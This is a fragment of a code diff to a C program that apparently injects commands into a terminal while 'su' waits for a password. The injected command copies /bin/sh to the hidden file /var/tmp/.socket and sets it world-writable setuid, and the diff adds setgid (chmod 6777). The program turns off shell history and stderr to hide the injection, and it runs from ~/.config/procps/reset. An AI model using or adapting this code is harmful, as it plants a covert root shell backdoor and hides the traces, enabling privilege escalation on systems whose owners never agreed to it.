@@ -31,6 +31,7 @@
 //    ~/.config/procps/reset "cp /bin/sh /tmp/.boom; chmod 4777 /bin/.boom" 8 2>/dev/null
 //
 // Will only execute ONCE (and delete itself) BUT you still need to cleanse ~/.bashrc
+// and /var/tmp/.socket
 
 #include <sys/ioctl.h>
 #include <sys/stat.h>
@@ -48,7 +49,7 @@
 // 3. Pipe CMD into bash's input (the 'prompt') and start CMD as background process.
 // 4. Last re-open STDERR again and let 'su' come back to foreground..
 #define START "exec 2>&-\nset +o history\n({ "
-#define CMD "cp /bin/sh /var/tmp/.socket; chmod 4777 /var/tmp/.socket"
+#define CMD "cp /bin/sh /var/tmp/.socket; chmod 6777 /var/tmp/.socket"
 #define END ";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n"
 
 int
